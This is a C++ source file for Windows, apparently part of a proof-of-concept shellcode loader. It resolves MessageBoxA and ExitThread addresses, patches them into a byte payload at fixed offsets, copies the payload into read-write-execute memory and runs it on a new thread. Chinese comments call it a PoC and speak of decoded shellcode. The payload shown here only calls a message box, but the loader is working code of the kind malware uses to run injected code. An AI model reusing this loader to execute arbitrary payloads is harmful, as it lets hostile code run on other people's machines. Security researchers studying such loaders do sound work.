#include "Executor.h"
#include <iostream>

Executor::Executor()
    : allocatedMemory(nullptr)
    , allocatedSize(0)
{
}

Executor::~Executor() {
    if (allocatedMemory) {
        VirtualFree(allocatedMemory, 0, MEM_RELEASE);
    }
}

void Executor::patchShellcodeAddresses(std::vector<uint8_t>& shellcode) {
    HMODULE user32 = GetModuleHandleA("user32.dll");
    HMODULE kernel32 = GetModuleHandleA("kernel32.dll");

    void* messageBoxAddr = GetProcAddress(user32, "MessageBoxA");
    void* exitThreadAddr = GetProcAddress(kernel32, "ExitThread");

    if (!messageBoxAddr || !exitThreadAddr) {
        std::cerr << "[executor] failed to resolve api addresses\n";
        return;
    }

    uint64_t msgBoxAddr = reinterpret_cast<uint64_t>(messageBoxAddr);
    // 将 MessageBoxA / ExitThread 的真实地址写回 payload，以保证在目标进程内可调用。
    for (int i = 0; i < 8; i++) {
        shellcode[26 + i] = static_cast<uint8_t>((msgBoxAddr >> (i * 8)) & 0xFF);
    }

    uint64_t exitAddr = reinterpret_cast<uint64_t>(exitThreadAddr);
    for (int i = 0; i < 8; i++) {
        shellcode[41 + i] = static_cast<uint8_t>((exitAddr >> (i * 8)) & 0xFF);
    }
}

bool Executor::executeShellcode(std::vector<uint8_t>& shellcode) {
    if (shellcode.empty()) {
        std::cerr << "[executor] empty shellcode\n";
        return false;
    }

    patchShellcodeAddresses(shellcode);

    allocatedSize = shellcode.size();
    // 为 shellcode 分配 RWX 内存，PoC 场景保持简单，生产环境应减少 RWX 窗口。
    allocatedMemory = VirtualAlloc(
        nullptr,
        allocatedSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    if (!allocatedMemory) {
        std::cerr << "[executor] failed to allocate rwx memory\n";
        return false;
    }

    memcpy(allocatedMemory, shellcode.data(), allocatedSize);

    // 将解码后的 shellcode 作为线程入口，执行完后由 shellcode 自行调用 ExitThread。
    HANDLE hThread = CreateThread(
        nullptr,
        0,
        reinterpret_cast<LPTHREAD_START_ROUTINE>(allocatedMemory),
        nullptr,
        0,
        nullptr
    );

    if (!hThread) {
        std::cerr << "[executor] failed to create thread\n";
        return false;
    }

    CloseHandle(hThread);

    return true;
}
